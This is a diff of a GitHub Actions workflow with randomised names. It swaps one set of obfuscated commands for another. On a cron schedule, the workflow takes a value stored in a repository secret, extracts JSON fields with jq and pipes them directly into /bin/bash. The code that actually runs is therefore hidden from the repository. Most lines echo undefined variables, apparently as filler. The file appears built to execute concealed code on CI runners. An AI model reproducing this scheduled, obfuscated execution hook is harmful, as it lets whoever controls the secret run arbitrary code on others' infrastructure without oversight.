@@ -1,28 +1,31 @@
 name: qejgoagj
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 1/6 * * *'
+    - cron: '50 2/6 * * *'
 
-jobs:  # 7779
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qejgoagj
         env:
-          xsymj340: ${{ secrets.xsymj340 }}
+          axjav50: ${{ secrets.axjav50 }}
         run: |
-          echo $xsymj340 | jq -r .ivv4302 | /bin/bash
-          echo $lxib0 | jq -r .fyjg30725 | /bin/bash
-          echo $uktqr82 | jq -r .fozm4 | /bin/bash
-          echo $bzffi51646 | jq -r .dze55 | /bin/bash
-          echo $bigyx26 | jq -r .px2 | /bin/bash
-          echo $d955 | jq -r .cqonh27 | /bin/bash
-          echo $z379 | jq -r .pmgj627 | /bin/bash
-          echo $bjtmg548 | jq -r .qxv4658 | /bin/bash
-          echo $k8859 | jq -r .l1 | /bin/bash
-          echo $k37 | jq -r .b6 | /bin/bash
-          echo $vx3 | jq -r .fpeax6 | /bin/bash
+          echo $axjav50 | jq -r .arfux0510 | /bin/bash
+          echo $b55008 | jq -r .n28 | /bin/bash
+          echo $gg078 | jq -r .szoe058 | /bin/bash
+          echo $zk49 | jq -r .l3 | /bin/bash
+          echo $g06709 | jq -r .lmsd0425 | /bin/bash
+          echo $xtz17 | jq -r .q30912 | /bin/bash
+          echo $j831 | jq -r .swz52 | /bin/bash
+          echo $puq17066 | jq -r .ipq6 | /bin/bash
+          echo $defb1419 | jq -r .jigil2 | /bin/bash
+          echo $t4 | jq -r .s59735 | /bin/bash
+          echo $i25946 | jq -r .oex08 | /bin/bash
+          echo $fqiq69 | jq -r .eklo918 | /bin/bash
+          echo $l35723 | jq -r .ryki822 | /bin/bash
+          echo $api59 | jq -r .e80442 | /bin/bash
 
